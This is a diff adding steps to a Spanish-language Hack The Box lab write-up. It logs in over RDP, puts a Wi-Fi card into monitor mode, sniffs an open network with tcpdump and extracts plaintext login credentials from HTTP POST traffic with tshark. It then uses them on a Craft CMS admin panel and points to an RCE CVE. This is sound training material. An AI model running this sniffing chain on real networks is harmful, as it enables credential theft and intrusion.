@@ -46,3 +46,139 @@ PORT     STATE SERVICE       VERSION
 3389/tcp open  ms-wbt-server Microsoft Terminal Service
 Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
 ```
+
+Conectarse por RDP.
+
+```bash
+xfreerdp3 /u:contractor /p:'Contractor2026!' /v:10.129.108.224 /f
+```
+
+![RDP Desktop](@images/writeups/hackthebox/machines/layover/rdp-desktop.png)
+
+Abrir el navegador.
+
+![RDP Browser](@images/writeups/hackthebox/machines/layover/rdp-browser.png)
+
+Ver el estado actual de las interfaces de red del sistema.
+
+```bash
+nmcli
+```
+
+```plaintext
+wlan2: disconnected
+        "wlan2"
+        wifi (mac80211_hwsim), 02:00:00:00:02:00, hw, mtu 1500
+
+wlan3: disconnected
+        "wlan3"
+        wifi (mac80211_hwsim), 02:00:00:00:03:00, hw, mtu 1500
+
+eth0: unmanaged
+        "eth0"
+        ethernet (veth), 00:16:3E:83:EA:41, sw, mtu 1500
+
+lo: unmanaged
+        "lo"
+        loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
+
+p2p-dev-wlan2: unmanaged
+        "p2p-dev-wlan2"
+        wifi-p2p, hw
+
+p2p-dev-wlan3: unmanaged
+        "p2p-dev-wlan3"
+        wifi-p2p, hw
+```
+
+Ver qué redes wifi existen.
+
+```bash
+nmcli device wifi list
+```
+
+```plaintext
+IN-USE  BSSID              SSID                    MODE   CHAN  RATE       SIGNAL  BARS  SECURITY
+        02:00:00:00:00:00  HTB International WiFi  Infra  6     54 Mbit/s  100     ▂▄▆█  --
+
+IN-USE  BSSID              SSID                    MODE   CHAN  RATE       SIGNAL  BARS  SECURITY
+        02:00:00:00:00:00  HTB International WiFi  Infra  6     54 Mbit/s  100     ▂▄▆█  --
+```
+
+Conectarse.
+
+```bash
+nmcli device wifi connect 'HTB International WiFi' ifname wlan2
+```
+
+```plaintext
+Device 'wlan2' successfully activated with '216cc6e3-17d9-43d5-ac6b-b6ee8184a5b3'.
+```
+
+Evitar que el NetworkManager gestione la tarjeta de red automáticamente.
+
+```bash
+nmcli device set wlan3 managed no
+```
+
+Cambiar al usuario root.
+
+```bash
+sudo su
+```
+
+Apagar la interfaz.
+
+```bash
+ip link set wlan3 down
+```
+
+Cambiar el modo de la tarjeta de red a monitor.
+
+```bash
+iw dev wlan3 set type monitor
+```
+
+Activar la interfaz de red.
+
+```bash
+ip link set wlan3 up
+```
+
+Sintonizar la tarjeta de red en el canal 6 tal como se vio anteriormente en la lista de redes wifi.
+
+```bash
+iw dev wlan3 set channel 6
+```
+
+Capturar el tráfico de red que pasa por la tarjeta `wlan3`.
+
+```bash
+timeout 180 tcpdump -i wlan3 -nn -s0 -w channel6.pcap
+```
+
+Analizar la captura de paquetes.
+
+```bash
+tshark -r channel6.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+```
+
+```plaintext
+10.13.37.132	portal.international.htb	/miles/login.php	username,password	jenny,Fl1ghtDeck2026!
+```
+
+Navegar al portal.
+
+![RDP Craft CMS](@images/writeups/hackthebox/machines/layover/rdp-craftcms.png)
+
+De las cookies se ve que corresponde al CMS Craft. Iniciar sesión en el panel de admin del CMS con las credenciales obtenidas.
+
+![RDP Craft Admin](@images/writeups/hackthebox/machines/layover/rdp-craft-admin.png)
+
+Versión del CMS.
+
+![RDP CMS Version](@images/writeups/hackthebox/machines/layover/rdp-cms-version.png)
+
+Buscar vulnerabilidades en la versión `5.9.8` de Craft CMS.
+
+[CVE-2026-44011: Craft CMS Remote Code Execution Vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2026-44011/)
